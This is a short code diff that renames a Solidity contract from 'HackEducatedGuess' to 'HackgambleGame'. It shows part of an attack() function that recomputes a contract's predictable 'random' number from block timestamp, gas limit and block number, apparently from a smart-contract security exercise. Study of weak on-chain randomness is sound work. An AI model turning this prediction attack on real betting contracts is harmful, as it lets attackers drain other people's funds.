@@ -12,7 +12,7 @@
               }
           }
    
-          contract HackEducatedGuess {
+          contract HackgambleGame {
               function attack(address _target) public returns (uint256) {
                   uint256 _randomnumber = uint256(sha256(abi.encodePacked(block.timestamp))) % block.gaslimit;
                   _randomnumber = _randomnumber % block.number;
